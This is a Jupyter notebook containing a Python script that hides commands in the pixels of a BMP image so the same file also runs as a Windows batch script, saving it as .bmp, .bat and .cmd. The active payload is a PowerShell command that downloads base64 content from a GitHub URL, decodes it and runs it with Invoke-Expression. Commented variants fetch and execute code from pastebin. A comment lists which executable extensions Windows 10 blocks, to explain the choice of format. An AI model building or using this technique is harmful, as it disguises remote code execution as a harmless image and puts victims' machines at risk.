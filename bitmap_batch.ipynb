{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "from PIL import Image\n",
    "import numpy as np\n",
    "\n",
    "## Several examples\n",
    "## text_to_encode goes here\n",
    "# text='calc.exe'\n",
    "# text='notepad.exe'\n",
    "# text='CompMgmtLauncher.exe'\n",
    "# text='\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" www.google.com'\n",
    "# text='LaunchWinApp.exe com.microsoft.print3d:calc.exe'\n",
    "## launch Windows apps using URIs taken from https://twitter.com/notwhickey/status/1338890964757340160\n",
    "# text='LaunchWinApp.exe com.microsoft.print3d://https://pastebin.com/raw/tdyShwLw'\n",
    "## download and execute using powershell\n",
    "# text='''\n",
    "# powershell \"$NEW_COMMAND = (Invoke-WebRequest -Uri \"https://pastebin.com/raw/tdyShwLw\").Content;Invoke-Expression $NEW_COMMAND\"\n",
    "# '''\n",
    "## download and execute base64 encoded commands\n",
    "text='''\n",
    "powershell $MYTEXT = (Invoke-WebRequest -Uri \"https://github.com/Fede654/bitmap-batch/raw/main/warning_popup\").Content;$DECODED = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($MYTEXT));Invoke-Expression $DECODED\n",
    "'''\n",
    "###\n",
    "\n",
    "# Split text in list of 3 elements' lists for RGB channels\n",
    "while len(text)%3 :\n",
    "    text += ' '\n",
    "splited = [[ord(text[i+2]),ord(text[i+1]),ord(text[i])] for i in range(0,len(text),3)]\n",
    "\n",
    "# creates an array representing an RGB image of 1 row\n",
    "height = 1\n",
    "rgb_info = np.zeros([height, len(splited)+2, 3], dtype=np.uint8)\n",
    "\n",
    "for idx in range(len(splited)):\n",
    "    rgb_info[0,idx+2] = splited[idx]\n",
    "\n",
    "# Load initial pixels, the 'magic numbers'\n",
    "rgb_info[0][0]=[10,0,0]\n",
    "rgb_info[0][1]=[13,10,13]\n",
    "\n",
    "# Generate bmp and batch files\n",
    "# Other executable extensions are blocked in W10: exe, scr, com, pif.\n",
    "# while vbs drops a compilation error\n",
    "# as inf or wsh is not of a compatible type\n",
    "# and ipa, osx, run are not recognized as executables\n",
    "Image.fromarray(rgb_info).save('command.bmp',format='BMP')\n",
    "Image.fromarray(rgb_info).save('command.bat',format='BMP')\n",
    "Image.fromarray(rgb_info).save('command.cmd',format='BMP')\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
